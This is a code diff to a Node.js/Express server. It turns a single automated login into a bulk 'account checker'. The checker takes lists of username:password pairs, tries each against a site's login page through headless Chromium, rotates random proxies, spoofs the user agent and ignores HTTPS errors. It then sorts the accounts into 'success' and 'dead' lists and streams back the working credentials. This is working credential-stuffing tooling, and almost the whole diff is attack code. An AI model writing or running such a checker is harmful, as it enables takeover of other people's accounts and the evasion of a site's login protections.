@@ -9,18 +9,19 @@ const PORT = process.env.PORT || 3000;
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-app.post('/api/login', async (req, res) => {
-  const { userId, password } = req.body;
-
-  if (!userId || !password) {
-    return res.status(400).json({ success: false, message: 'User ID and password are required' });
-  }
-
+async function tryLogin(userId, password, proxy) {
   let browser;
   try {
-    browser = await chromium.launch({ headless: true });
+    const launchOpts = { headless: true, args: [] };
+    if (proxy) {
+      const [host, port] = proxy.split(':');
+      launchOpts.args.push(`--proxy-server=${host}:${port}`);
+    }
+
+    browser = await chromium.launch(launchOpts);
     const context = await browser.newContext({
-      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+      ignoreHTTPSErrors: true
     });
     const page = await context.newPage();
 
@@ -29,75 +30,105 @@ app.post('/api/login', async (req, res) => {
       timeout: 30000
     });
 
-    // Dismiss cookie banner if present
     try {
       const cookieBtn = page.locator('button:has-text("ACCEPT ALL COOKIES")');
       if (await cookieBtn.isVisible({ timeout: 3000 })) {
         await cookieBtn.click();
         await page.waitForTimeout(1000);
       }
-    } catch {
-      // Cookie banner might not appear
-    }
+    } catch {}
 
-    // Fill User ID
     await page.waitForSelector('#username', { timeout: 10000 });
     await page.fill('#username', userId);
-
-    // Fill Password
     await page.fill('input[type="password"]', password);
-
-    // Click Log in button
     await page.click('#login_button');
-
-    // Wait for navigation or response
     await page.waitForTimeout(5000);
 
     const currentUrl = page.url();
-    const pageTitle = await page.title();
-
-    // Check if login was successful
     const isLoggedIn = !currentUrl.includes('/credentials') && !currentUrl.includes('secure-login');
-
-    // Take screenshot for verification
-    const screenshot = await page.screenshot({ encoding: 'base64' });
 
     await browser.close();
 
-    if (isLoggedIn) {
-      return res.json({
-        success: true,
-        message: 'Login successful',
-        redirectedTo: currentUrl,
-        pageTitle,
-        screenshot: `data:image/png;base64,${screenshot}`
-      });
-    }
-
-    // Check for error messages
-    let errorMessage = 'Login failed';
-    try {
-      const errorEl = await page.textContent('[class*="error"], [class*="alert"], .notification--error');
-      if (errorEl) errorMessage = errorEl.trim();
-    } catch {
-      // No error element found
-    }
-
-    return res.json({
-      success: false,
-      message: errorMessage,
-      currentUrl,
-      pageTitle,
-      screenshot: `data:image/png;base64,${screenshot}`
-    });
-
+    return {
+      success: isLoggedIn,
+      redirectedTo: currentUrl,
+      proxy: proxy || 'direct'
+    };
   } catch (err) {
-    if (browser) await browser.close();
-    return res.status(500).json({
+    if (browser) await browser.close().catch(() => {});
+    return {
       success: false,
-      message: `Automation error: ${err.message}`
-    });
+      error: err.message,
+      proxy: proxy || 'direct'
+    };
   }
+}
+
+app.post('/api/check', async (req, res) => {
+  const { accounts, proxies } = req.body;
+
+  if (!accounts || !accounts.length) {
+    return res.status(400).json({ error: 'No accounts provided' });
+  }
+
+  res.writeHead(200, {
+    'Content-Type': 'text/event-stream',
+    'Cache-Control': 'no-cache',
+    'Connection': 'keep-alive',
+    'X-Accel-Buffering': 'no'
+  });
+
+  const proxyList = proxies || [];
+  const results = { success: [], dead: [] };
+
+  for (let i = 0; i < accounts.length; i++) {
+    const line = accounts[i].trim();
+    if (!line || !line.includes(':')) continue;
+
+    const colonIdx = line.indexOf(':');
+    const userId = line.substring(0, colonIdx).trim();
+    const password = line.substring(colonIdx + 1).trim();
+
+    if (!userId || !password) continue;
+
+    const proxy = proxyList.length > 0
+      ? proxyList[Math.floor(Math.random() * proxyList.length)].trim()
+      : null;
+
+    const result = await tryLogin(userId, password, proxy);
+
+    const entry = {
+      user: userId,
+      pass: password,
+      proxy: result.proxy,
+      url: result.redirectedTo || '',
+      error: result.error || ''
+    };
+
+    if (result.success) {
+      results.success.push(entry);
+    } else {
+      results.dead.push(entry);
+    }
+
+    res.write(`data: ${JSON.stringify({
+      type: 'progress',
+      index: i + 1,
+      total: accounts.length,
+      result: result.success ? 'success' : 'dead',
+      entry
+    })}\n\n`);
+  }
+
+  res.write(`data: ${JSON.stringify({
+    type: 'done',
+    total: accounts.length,
+    successCount: results.success.length,
+    deadCount: results.dead.length,
+    results
+  })}\n\n`);
+
+  res.end();
 });
 
 app.get('/api/health', (req, res) => {
